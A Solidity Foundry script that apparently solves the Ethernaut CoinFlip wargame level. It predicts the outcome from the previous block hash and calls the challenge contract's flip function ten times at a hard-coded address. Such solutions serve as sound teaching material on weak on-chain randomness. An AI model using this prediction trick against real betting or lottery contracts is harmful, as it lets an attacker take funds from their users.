// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip} from "../../src/Ethernaut/CoinFlip.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        GuessSide guessSide = new GuessSide();

        // 10 times
        guessSide.geussFlip();
        guessSide.geussFlip();
        guessSide.geussFlip();
        guessSide.geussFlip();
        guessSide.geussFlip();
        guessSide.geussFlip();
        guessSide.geussFlip();
        guessSide.geussFlip();
        guessSide.geussFlip();
        guessSide.geussFlip();

        vm.stopBroadcast();
    }
}

interface IGuessSide {
    function flip(bool _guess) external;
}

contract GuessSide {
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    IGuessSide public guess = IGuessSide(0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF);

    function geussFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        guess.flip(side);
    }
}
